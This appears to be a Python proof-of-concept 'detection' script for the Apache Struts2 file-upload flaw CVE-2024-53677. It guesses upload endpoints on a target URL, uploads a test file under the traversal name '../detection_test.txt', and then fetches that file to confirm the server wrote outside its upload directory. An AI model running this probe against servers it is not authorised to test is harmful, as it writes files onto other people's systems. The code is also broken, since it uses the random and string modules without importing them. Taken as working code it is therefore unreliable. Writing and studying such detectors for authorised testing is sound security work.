import requests
import argparse
from urllib.parse import urljoin
from requests_toolbelt.multipart.encoder import MultipartEncoder

def test_vulnerability(target_url, upload_endpoint):
    """
    Test if the Apache Struts2 instance is vulnerable to CVE-2024-53677 (S2-067).
    """
    detection_url = urljoin(target_url, upload_endpoint)
    print(f"[INFO] Testing for vulnerability at {detection_url}")

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Connection": "close"
    }

    # Test payload for detecting path traversal vulnerability
    test_file_name = "detection_test.txt"
    detection_payload = "Vulnerability detection test content"
    test_upload_location = "../detection_test.txt"  # Attempt path traversal

    # Create multipart request
    files = {
        "Upload": (test_file_name, detection_payload, "application/octet-stream"),
        "uploadFileName": test_upload_location
    }
    boundary = '----WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    m = MultipartEncoder(fields=files, boundary=boundary)
    headers["Content-Type"] = m.content_type

    try:
        response = requests.post(detection_url, headers=headers, data=m, timeout=10)
        if response.status_code == 200:
            print(f"[INFO] File upload test completed. Verifying file location...")
            return verify_vulnerability(target_url, "detection_test.txt")
        elif response.status_code in [403, 401]:
            print(f"[WARNING] Upload blocked. HTTP Status: {response.status_code}. Possible WAF or permissions issue.")
        else:
            print(f"[ERROR] Upload failed. HTTP Status: {response.status_code}")
            print(f"[DEBUG] Response: {response.text[:200]}")
        return False
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Detection test failed: {e}")
        return False

def verify_vulnerability(target_url, test_file_path):
    """
    Verify if the test file was uploaded to the target server and is accessible.
    """
    verification_url = urljoin(target_url, test_file_path)
    print(f"[INFO] Verifying uploaded file at {verification_url}")

    try:
        response = requests.get(verification_url, timeout=10)
        if response.status_code == 200 and "Vulnerability detection test content" in response.text:
            print(f"[ALERT] Target is vulnerable! File accessible at: {verification_url}")
            return True
        elif response.status_code == 404:
            print("[INFO] Test file not found. Target may not be vulnerable.")
        else:
            print(f"[INFO] Unexpected response. HTTP Status: {response.status_code}")
            print(f"[DEBUG] Response Content: {response.text[:200]}")
        return False
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Verification failed: {e}")
        return False

def discover_upload_endpoint(target_url):
    """
    Attempt to discover common upload endpoints for Apache Struts2.
    """
    print("[INFO] Attempting to discover common upload endpoints...")
    common_endpoints = [
        "/upload.action",
        "/fileUpload.action",
        "/uploadFile.action",
        "/struts2-showcase/fileUpload.action"
    ]

    for endpoint in common_endpoints:
        test_url = urljoin(target_url, endpoint)
        try:
            response = requests.options(test_url, timeout=5)
            if response.status_code in [200, 403]:
                print(f"[INFO] Potential upload endpoint found: {endpoint}")
                return endpoint
        except requests.exceptions.RequestException:
            continue
    print("[WARNING] No common upload endpoints discovered.")
    return None

def main():
    parser = argparse.ArgumentParser(description="CVE-2024-53677 Vulnerability Detection Script")
    parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g., http://example.com)")
    parser.add_argument("--upload_endpoint", help="Path to file upload endpoint (e.g., /upload.action)")
    args = parser.parse_args()

    print("[INFO] Starting CVE-2024-53677 detection...")
    target_url = args.url.rstrip("/")

    # Discover endpoint if not provided
    upload_endpoint = args.upload_endpoint
    if not upload_endpoint:
        upload_endpoint = discover_upload_endpoint(target_url)
        if not upload_endpoint:
            print("[ERROR] No valid upload endpoints discovered. Exiting.")
            return

    # Test for vulnerability
    if test_vulnerability(target_url, upload_endpoint):
        print("[ALERT] Target is vulnerable to CVE-2024-53677!")
    else:
        print("[INFO] Target does not appear to be vulnerable to CVE-2024-53677.")

    print("[INFO] Detection process completed.")

if __name__ == "__main__":
    main()
